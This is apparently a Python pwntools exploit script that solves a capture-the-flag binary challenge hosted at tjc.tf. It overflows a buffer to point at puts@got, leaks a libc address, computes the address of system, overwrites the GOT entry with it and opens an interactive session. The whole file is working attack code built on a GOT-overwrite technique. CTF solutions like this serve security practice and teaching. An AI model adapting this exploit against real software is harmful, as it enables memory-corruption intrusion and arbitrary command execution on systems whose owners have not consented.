#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6", False)
ld = ELF("./ld-2.39.so", False)

context.binary = exe
gdb_script = '''
    b *main+856
    b *main+509
    c
'''
#context.log_level="debug"
def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)

    else:
        r = remote("tjc.tf", 31509)

    return r


def main():
    r = conn()

    r.sendlineafter(b"Event time? (1-24) ", b"1")
    payload_leak = b"A" * 132 + p64(exe.got.puts) # over write puts@got
    r.sendlineafter(b"Event name? ", payload_leak)

    r.recvuntil(b':00')
    r.recvline()
    line = r.recvline().strip().split(b':00 -')

    p1= p32(int(line[0]))
    p2 = u32(line[1].ljust(4,b'\x00'))

    full_bytes = p1 + bytes([p64(p2)[1]]) + bytes([p64(p2)[2]])
    full_addr = u64(full_bytes.ljust(8, b'\x00'))

    log.info(f"Puts at {hex(full_addr)}")

    libc.address = full_addr - libc.sym.puts
    system_addr = libc.sym.system

    log.info(f"Libc at {hex(libc.address)}")
    log.info(f"System at {hex(system_addr)}")

    # Overwrite puts@got with system

    top_digits = str(hex(system_addr))[2:6]
    parsed_digits = bytes.fromhex(top_digits)[::-1]
    #print(parsed_digits)

    bottom_digits = int(str(hex(system_addr))[6:], 16)
    #print(bottom_digits)

    r.sendlineafter(b"Event time? ", str(bottom_digits).encode()) 
    r.sendlineafter(b"Event name? ", parsed_digits)


    r.interactive()
    r.close()


if __name__ == "__main__":
    main()
